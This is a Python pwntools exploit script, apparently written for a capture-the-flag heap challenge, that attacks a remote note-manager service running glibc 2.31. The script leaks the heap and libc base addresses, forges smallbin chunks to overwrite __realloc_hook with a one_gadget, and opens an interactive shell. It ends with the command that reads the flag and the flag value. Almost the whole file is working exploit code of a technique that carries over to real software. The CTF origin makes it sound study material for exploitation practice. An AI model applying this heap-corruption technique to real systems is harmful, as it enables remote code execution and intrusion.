#!/usr/bin/env python3
from pwn import *

#helpers
def new( size, title, data , shell=False):
 io.sendlineafter('> ','1')
 io.sendlineafter('> ',str(size))
 if not shell:
  io.sendafter('> ', title)
  io.sendafter('> ', data)

def delete( idx ):
 io.sendlineafter('> ','2')
 io.sendlineafter('> ',str(idx))

def edit( idx, data ):
 io.sendlineafter('> ','3')
 io.sendlineafter('> ',str(idx))
 io.sendafter('> ',data)

def show( idx ):
 io.sendlineafter('> ','4')
 io.sendlineafter('> ',str(idx))
 return io.recvuntil('HEAP')[:-4].split(b': ')[1].strip()

# offsets (libc 2.31)
unsorted_bin_offset = 0x1ebbe0
smallbin_offset = 0x1ebde0
__free_hook = 0x1eeb28
__malloc_hook = 0x1ebb70
realloc = 0x9e000
__realloc_hook = __malloc_hook - 0x8

# exp
if __name__ == '__main__':
# io = process('./heap_heap',env={'LD_PRELOAD':'./libc.so.6'})
 io = remote('185.14.184.242', 13990)

 new(0x418, 'HK', 'HK') #0
 new(0x18, 'HK', 'HK') #1

 delete(0)
 new(0x208, 'HK', 'HK') #2
 edit(0, b'AAAAAAA:')
 heap_base = u64(show( 0 ).split(b':')[1] + b'\0\0') - 0x3c0
 print(f'[*] Heap base: {hex(heap_base)}')

 edit(0, b'A'*0x20f + b':')
 libc_leak = u64(show( 0 ).split(b':')[1] + b'\0\0')
 libc_base = libc_leak - unsorted_bin_offset
 print(f'[*] Libc base: {hex(libc_base)}')

 edit(0, b'A'*0x208 + p64(0x211))

 new(0x228 ,'HK' ,'HK') #3
 trampoline = [
  libc_base + smallbin_offset, heap_base + 0x5f0,
  heap_base + 0x5e0, heap_base + 0x600,
  0, heap_base + 0x610,
  0, heap_base + 0x620,
  0, heap_base + 0x630,
  0, heap_base + 0x640,
  0, heap_base + 0x650,
  0, heap_base + 0x80
 ]
 edit(0, b'A'*0x208 + p64(0x211) +\
  flat(trampoline, arch='amd64'))

 new(0x1f8, 'HK', 'HK') #4
 edit(0, b'A'*0x208 + p64(0x211) +\
  p64(libc_base + smallbin_offset) * 2 +\
  p64(0)*11 + p64(0x211) +\
  p64(libc_base + __realloc_hook) + p64(heap_base + 0x10)
 )

 new(0x1f8, 'HK' , 'HK') #5
 new(0x1f8 ,p64( libc_base + 0xe6aee ) +\
  p64(libc_base + realloc + 24), '\0'
 )
 new(0x1f8, 'HK', 'HK', shell=True)
 io.interactive()
 # cat /home/heap_heap/flag
 # S4CTF{h34p_570r135_f0r_3v3333333333r}